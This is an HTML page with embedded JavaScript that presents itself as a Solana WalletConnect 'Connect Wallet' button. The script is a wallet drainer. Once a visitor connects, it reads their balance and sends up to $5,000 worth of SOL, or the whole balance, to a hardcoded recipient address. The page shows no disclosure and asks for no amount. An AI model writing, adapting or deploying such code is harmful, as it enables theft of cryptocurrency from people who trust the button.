<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WalletConnect Solana Transfer</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/client"></script>
    <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-wallets"></script>
    <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base"></script>
</head>
<body>
    <h1>Solana WalletConnect Transfer</h1>
    <button id="connectWallet">Connect Wallet</button>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const connectButton = document.getElementById('connectWallet');
            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));

            const recipientAddress = "AaTLKPX9WKSC8eWvkUXj7GTfdx11gAmuYrNBwMSbBYSE"; // Replace with your recipient address
            const maxTransferLimitUSD = 5000; // Maximum transfer limit in USD
            const solToUsdRate = 25; // Replace with the live SOL to USD rate

            async function connectWallet() {
                try {
                    // Initialize WalletConnect
                    const walletAdapter = new solanaWalletAdapterWallets.WalletConnectWalletAdapter();

                    // Connect to the wallet
                    await walletAdapter.connect();
                    const publicKey = walletAdapter.publicKey.toString();
                    console.log("Connected wallet:", publicKey);

                    // Fetch wallet balance
                    const balanceLamports = await connection.getBalance(walletAdapter.publicKey);
                    const balanceSol = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
                    console.log("Wallet balance (SOL):", balanceSol);

                    // Calculate transfer amount (limited by maxTransferLimitUSD)
                    const maxTransferSol = maxTransferLimitUSD / solToUsdRate;
                    const transferAmount = Math.min(balanceSol, maxTransferSol);
                    console.log("Transfer amount (SOL):", transferAmount);

                    if (transferAmount <= 0) {
                        alert("Insufficient balance for transfer.");
                        return;
                    }

                    // Perform the transfer
                    await performTransfer(walletAdapter, publicKey, transferAmount);
                } catch (error) {
                    console.error("Connection error:", error);
                    alert("Failed to connect wallet or perform transfer.");
                }
            }

            async function performTransfer(walletAdapter, publicKey, amountSol) {
                try {
                    const transaction = new solanaWeb3.Transaction();

                    // Add transfer instruction
                    transaction.add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: new solanaWeb3.PublicKey(publicKey),
                            toPubkey: new solanaWeb3.PublicKey(recipientAddress),
                            lamports: amountSol * solanaWeb3.LAMPORTS_PER_SOL,
                        })
                    );

                    // Get recent blockhash
                    const { blockhash } = await connection.getRecentBlockhash();
                    transaction.recentBlockhash = blockhash;
                    transaction.feePayer = new solanaWeb3.PublicKey(publicKey);

                    // Sign and send transaction
                    const signedTransaction = await walletAdapter.signTransaction(transaction);
                    const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                    await connection.confirmTransaction(signature, 'finalized');

                    console.log("Transfer successful. Signature:", signature);
                    alert(`Transfer complete! Transaction signature: ${signature}`);
                } catch (error) {
                    console.error("Transfer error:", error);
                    alert("Transfer failed.");
                }
            }

            // Bind event listener to the connect button
            connectButton.addEventListener('click', connectWallet);
        });
    </script>
</body>
</html>
